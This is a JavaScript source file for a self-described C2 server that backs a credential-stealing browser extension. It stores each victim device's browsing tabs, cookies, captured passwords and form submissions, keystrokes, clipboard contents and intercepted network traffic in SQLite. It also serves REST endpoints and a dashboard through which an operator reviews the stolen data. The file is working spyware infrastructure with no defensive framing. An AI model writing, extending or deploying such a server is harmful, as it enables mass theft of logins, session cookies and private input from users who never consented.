const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const sqlite3 = require('sqlite3').verbose();
const cors = require('cors');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const PORT = process.env.PORT || 8443;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public')); // serves dashboard.html

// SQLite Database
const db = new sqlite3.Database('c2.db');

db.serialize(() => {
  // Devices
  db.run(`CREATE TABLE IF NOT EXISTS devices (
    id TEXT PRIMARY KEY,
    first_seen INTEGER,
    last_seen INTEGER,
    status TEXT,
    user_agent TEXT
  )`);

  // Tabs (history)
  db.run(`CREATE TABLE IF NOT EXISTS tabs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    tab_id INTEGER,
    url TEXT,
    title TEXT,
    active INTEGER,
    timestamp INTEGER
  )`);

  // Cookies
  db.run(`CREATE TABLE IF NOT EXISTS cookies (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    name TEXT,
    value TEXT,
    domain TEXT,
    path TEXT,
    secure INTEGER,
    http_only INTEGER,
    url TEXT,
    timestamp INTEGER
  )`);

  // Passwords
  db.run(`CREATE TABLE IF NOT EXISTS passwords (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    url TEXT,
    username TEXT,
    password TEXT,
    timestamp INTEGER
  )`);

  // Keylogs
  db.run(`CREATE TABLE IF NOT EXISTS keylogs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    key TEXT,
    target TEXT,
    id_field TEXT,
    name_field TEXT,
    type_field TEXT,
    url TEXT,
    timestamp INTEGER
  )`);

  // Clipboard
  db.run(`CREATE TABLE IF NOT EXISTS clipboard (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    content TEXT,
    url TEXT,
    timestamp INTEGER
  )`);

  // WebSocket messages
  db.run(`CREATE TABLE IF NOT EXISTS websocket_messages (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    content TEXT,
    url TEXT,
    timestamp INTEGER
  )`);

  // Fetch intercepts
  db.run(`CREATE TABLE IF NOT EXISTS fetch_intercepts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    url TEXT,
    body TEXT,
    timestamp INTEGER
  )`);
});

// ===================== REST API =====================

// Ingest endpoint (HTTP fallback)
app.post('/api/ingest', (req, res) => {
  const data = req.body;
  if (!data.deviceId) return res.sendStatus(400);
  handleData(data);
  res.sendStatus(200);
});

// Get devices
app.get('/api/devices', (req, res) => {
  db.all(`SELECT id, first_seen, last_seen, status FROM devices ORDER BY last_seen DESC`, (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

// Get tabs for device
app.get('/api/devices/:id/tabs', (req, res) => {
  const { id } = req.params;
  db.all(`SELECT * FROM tabs WHERE device_id = ? ORDER BY timestamp DESC LIMIT 100`, [id], (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

// Get cookies for device
app.get('/api/devices/:id/cookies', (req, res) => {
  const { id } = req.params;
  db.all(`SELECT * FROM cookies WHERE device_id = ? ORDER BY timestamp DESC`, [id], (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

// Get passwords for device
app.get('/api/devices/:id/passwords', (req, res) => {
  const { id } = req.params;
  db.all(`SELECT * FROM passwords WHERE device_id = ? ORDER BY timestamp DESC`, [id], (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

// Get keylogs for device
app.get('/api/devices/:id/keylogs', (req, res) => {
  const { id } = req.params;
  db.all(`SELECT * FROM keylogs WHERE device_id = ? ORDER BY timestamp DESC LIMIT 500`, [id], (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

// Get clipboard for device
app.get('/api/devices/:id/clipboard', (req, res) => {
  const { id } = req.params;
  db.all(`SELECT * FROM clipboard WHERE device_id = ? ORDER BY timestamp DESC`, [id], (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

// Get WebSocket messages for device
app.get('/api/devices/:id/websocket', (req, res) => {
  const { id } = req.params;
  db.all(`SELECT * FROM websocket_messages WHERE device_id = ? ORDER BY timestamp DESC`, [id], (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

// Get fetch intercepts for device
app.get('/api/devices/:id/fetch', (req, res) => {
  const { id } = req.params;
  db.all(`SELECT * FROM fetch_intercepts WHERE device_id = ? ORDER BY timestamp DESC`, [id], (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

// ===================== WebSocket Server =====================

const clients = new Map(); // deviceId -> WebSocket

wss.on('connection', (ws, req) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const deviceId = url.searchParams.get('id');
  if (!deviceId) {
    ws.close();
    return;
  }

  // Store client
  clients.set(deviceId, ws);
  console.log(`[WS] Device ${deviceId} connected`);

  // Update device status online
  db.run(`INSERT OR REPLACE INTO devices (id, first_seen, last_seen, status) 
          VALUES (?, COALESCE((SELECT first_seen FROM devices WHERE id=?), ?), ?, 'online')`,
          [deviceId, deviceId, Date.now(), Date.now()]);

  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      data.deviceId = deviceId;
      handleData(data);
    } catch (e) {}
  });

  ws.on('close', () => {
    clients.delete(deviceId);
    db.run(`UPDATE devices SET status = 'offline', last_seen = ? WHERE id = ?`, [Date.now(), deviceId]);
    console.log(`[WS] Device ${deviceId} disconnected`);
    broadcastDeviceList();
  });

  ws.on('error', () => {});
});

// Broadcast to all dashboard clients (they have deviceId = 'dashboard')
function broadcastDeviceList() {
  db.all(`SELECT id, first_seen, last_seen, status FROM devices ORDER BY last_seen DESC`, (err, rows) => {
    if (err) return;
    const msg = JSON.stringify({ type: 'device_list', devices: rows });
    for (const [id, client] of clients) {
      if (id === 'dashboard' && client.readyState === WebSocket.OPEN) {
        client.send(msg);
      }
    }
  });
}

// Handle incoming data from extension
function handleData(data) {
  const { deviceId, type } = data;
  if (!deviceId || !type) return;

  // Update device last_seen and status
  db.run(`UPDATE devices SET last_seen = ?, status = 'online' WHERE id = ?`, [Date.now(), deviceId]);

  switch (type) {
    case 'heartbeat':
      db.run(`UPDATE devices SET last_seen = ? WHERE id = ?`, [Date.now(), deviceId]);
      // Store tabs
      if (data.tabs) {
        data.tabs.forEach(tab => {
          db.run(`INSERT INTO tabs (device_id, tab_id, url, title, active, timestamp) 
                  VALUES (?, ?, ?, ?, ?, ?)`,
                  [deviceId, tab.tabId || 0, tab.url || '', tab.title || '', tab.active ? 1 : 0, Date.now()]);
        });
      }
      // Update current active tab
      if (data.activeTab) {
        db.run(`INSERT INTO tabs (device_id, tab_id, url, title, active, timestamp) 
                VALUES (?, ?, ?, ?, 1, ?)`,
                [deviceId, data.activeTab.tabId || 0, data.activeTab.url || '', data.activeTab.title || '', Date.now()]);
      }
      break;

    case 'tab_update':
      db.run(`INSERT INTO tabs (device_id, tab_id, url, title, active, timestamp) 
              VALUES (?, ?, ?, ?, ?, ?)`,
              [deviceId, data.tabId, data.url || '', data.title || '', data.active ? 1 : 0, Date.now()]);
      break;

    case 'tab_switch':
      db.run(`INSERT INTO tabs (device_id, tab_id, url, title, active, timestamp) 
              VALUES (?, ?, ?, ?, 1, ?)`,
              [deviceId, data.tabId, data.url || '', data.title || '', Date.now()]);
      break;

    case 'cookie':
      const c = data.cookie;
      db.run(`INSERT INTO cookies (device_id, name, value, domain, path, secure, http_only, url, timestamp) 
              VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
              [deviceId, c.name, c.value, c.domain, c.path, c.secure ? 1 : 0, c.httpOnly ? 1 : 0, c.url || '', Date.now()]);
      break;

    case 'password':
      const creds = data.credentials || {};
      const username = creds.username || creds.email || creds.user || '';
      const password = creds.password || creds.pass || creds.pwd || '';
      db.run(`INSERT INTO passwords (device_id, url, username, password, timestamp) 
              VALUES (?, ?, ?, ?, ?)`,
              [deviceId, data.url, username, password, Date.now()]);
      break;

    case 'keylog':
      const k = data.data;
      db.run(`INSERT INTO keylogs (device_id, key, target, id_field, name_field, type_field, url, timestamp) 
              VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
              [deviceId, k.key || '', k.target || '', k.id || '', k.name || '', k.type || '', k.url || '', Date.now()]);
      break;

    case 'password_fill':
      db.run(`INSERT INTO keylogs (device_id, key, target, url, timestamp) 
              VALUES (?, 'AUTOFILL_PASSWORD', ?, ?, ?)`,
              [deviceId, data.data.value, data.data.url, Date.now()]);
      break;

    case 'form_submit':
      const vals = data.data.values || {};
      const uname = vals.username || vals.email || vals.user || '';
      const pwd = vals.password || vals.pass || vals.pwd || '';
      if (uname || pwd) {
        db.run(`INSERT INTO passwords (device_id, url, username, password, timestamp) 
                VALUES (?, ?, ?, ?, ?)`,
                [deviceId, data.data.url, uname, pwd, Date.now()]);
      }
      break;

    case 'clipboard':
      db.run(`INSERT INTO clipboard (device_id, content, url, timestamp) 
              VALUES (?, ?, ?, ?)`,
              [deviceId, data.data.content, data.data.url, Date.now()]);
      break;

    case 'websocket':
      db.run(`INSERT INTO websocket_messages (device_id, content, url, timestamp) 
              VALUES (?, ?, ?, ?)`,
              [deviceId, data.data.content, data.data.url, Date.now()]);
      break;

    case 'fetch_intercept':
      db.run(`INSERT INTO fetch_intercepts (device_id, url, body, timestamp) 
              VALUES (?, ?, ?, ?)`,
              [deviceId, data.data.url, data.data.body, Date.now()]);
      break;
  }

  // Broadcast device list update to all dashboard clients
  broadcastDeviceList();
}

// ===================== Serve Dashboard =====================
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// ===================== Start Server =====================
server.listen(PORT, () => {
  console.log(`🚀 C2 Server running on port ${PORT}`);
  console.log(`   Dashboard: https://localhost:${PORT}/`);
  console.log(`   WebSocket: wss://localhost:${PORT}`);
});
